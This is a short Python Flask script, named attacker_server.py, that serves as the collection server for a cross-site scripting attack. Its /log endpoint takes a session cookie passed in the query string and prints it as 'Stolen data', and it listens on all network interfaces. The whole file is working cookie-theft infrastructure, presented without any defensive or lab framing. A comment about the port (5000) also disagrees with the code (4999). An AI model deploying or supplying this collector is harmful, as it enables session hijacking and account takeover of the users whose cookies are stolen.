# attacker_server.py
from flask import Flask, request

app = Flask(__name__)

# Route to receive session cookie or any data sent from the XSS attack
@app.route('/log', methods=['GET'])
def log_data():
    # Get the cookie or data from the URL query
    cookie = request.args.get('session', None)
    
    if cookie:
        # Print out the stolen session cookie or other data
        print(f"Stolen data: {cookie}")
    else:
        print("No data received.")
    
    return 'Logged data', 200

if __name__ == '__main__':
    # Start the Flask server on port 5000
    app.run(host='0.0.0.0', port=4999)
